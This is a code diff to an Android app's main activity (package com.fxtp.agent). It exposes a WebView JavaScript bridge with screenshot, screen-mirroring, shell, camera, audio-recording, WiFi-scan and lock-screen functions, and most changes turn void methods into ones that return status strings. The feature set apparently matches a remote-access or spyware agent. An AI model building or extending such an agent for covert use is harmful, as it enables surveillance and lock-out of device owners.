@@ -3,7 +3,6 @@ package com.fxtp.agent;
 import android.app.Activity;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ContentResolver;
@@ -108,7 +107,7 @@ public class MainActivity extends AppCompatActivity {
         webView.setWebViewClient(new WebViewClient());
         webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
 
-        // Load control.html from assets
+        // Load device.html from assets
         webView.loadUrl("file:///android_asset/device.html");
 
         // Request permissions
@@ -139,6 +138,12 @@ public class MainActivity extends AppCompatActivity {
             Log.d("FXTP", msg);
         }
 
+        // --- Ping ---
+        @JavascriptInterface
+        public String ping() {
+            return "pong";
+        }
+
         // --- Screenshot ---
         @JavascriptInterface
         public String takeScreenshot() {
@@ -159,8 +164,8 @@ public class MainActivity extends AppCompatActivity {
 
         // --- Mirror ---
         @JavascriptInterface
-        public void startMirror() {
-            if (isMirroring) return;
+        public String startMirror() {
+            if (isMirroring) return "Already mirroring";
             isMirroring = true;
             mirrorHandler = new Handler();
             mirrorRunnable = new Runnable() {
@@ -173,14 +178,16 @@ public class MainActivity extends AppCompatActivity {
                 }
             };
             mirrorHandler.post(mirrorRunnable);
+            return "Mirror started";
         }
 
         @JavascriptInterface
-        public void stopMirror() {
+        public String stopMirror() {
             isMirroring = false;
             if (mirrorHandler != null) {
                 mirrorHandler.removeCallbacks(mirrorRunnable);
             }
+            return "Mirror stopped";
         }
 
         // --- Shell ---
@@ -255,7 +262,7 @@ public class MainActivity extends AppCompatActivity {
 
         // --- Notification ---
         @JavascriptInterface
-        public void sendNotification(String msg) {
+        public String sendNotification(String msg) {
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     NotificationChannel ch = new NotificationChannel("fxtp_ch", "FXTP", NotificationManager.IMPORTANCE_HIGH);
@@ -270,9 +277,11 @@ public class MainActivity extends AppCompatActivity {
                 NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                 if (mgr != null) {
                     mgr.notify((int) System.currentTimeMillis(), b.build());
+                    return "Notification sent";
                 }
+                return "Notification manager not available";
             } catch (Exception e) {
-                Log.e("FXTP", "Notification error", e);
+                return "ERROR: " + e.getMessage();
             }
         }
 
@@ -370,16 +379,17 @@ public class MainActivity extends AppCompatActivity {
 
         // --- Camera ---
         @JavascriptInterface
-        public void captureCamera() {
+        public String captureCamera() {
             try {
                 Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                 startActivityForResult(intent, 200);
+                return "Camera opened";
             } catch (Exception e) {
-                Log.e("FXTP", "Camera error", e);
+                return "ERROR: " + e.getMessage();
             }
         }
 
-        // --- Audio ---
+        // --- Audio Recording ---
         @JavascriptInterface
         public String startAudioRecording(int duration) {
             try {
@@ -493,7 +503,7 @@ public class MainActivity extends AppCompatActivity {
                 return "ERROR: " + e.getMessage();
             }
         }
-
+        
         // --- WiFi ---
         @JavascriptInterface
         public String scanWifi() {
@@ -612,19 +622,21 @@ public class MainActivity extends AppCompatActivity {
 
         // --- Lock Screen ---
         @JavascriptInterface
-        public void startLockScreen() {
+        public String startLockScreen() {
             Intent lockIntent = new Intent(MainActivity.this, LockActivity.class);
             lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
             startActivity(lockIntent);
+            return "Lock screen activated";
         }
 
         // --- Display HTML ---
         @JavascriptInterface
-        public void displayHtml(String html) {
+        public String displayHtml(String html) {
             Intent intent = new Intent(MainActivity.this, LockActivity.class);
             intent.putExtra("html_content", html);
             intent.putExtra("display_html", true);
             startActivity(intent);
+            return "HTML displayed";
         }
     }
 
@@ -660,7 +672,6 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == 200 && resultCode == RESULT_OK) {
-            // Handle camera result – we can get the image and send to JS
             Bitmap bitmap = (Bitmap) data.getExtras().get("data");
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
@@ -674,5 +685,9 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
         isMirroring = false;
         if (mirrorHandler != null) mirrorHandler.removeCallbacks(mirrorRunnable);
+        if (audioRecorder != null) {
+            audioRecorder.release();
+            audioRecorder = null;
+        }
     }
-                    }
+        }
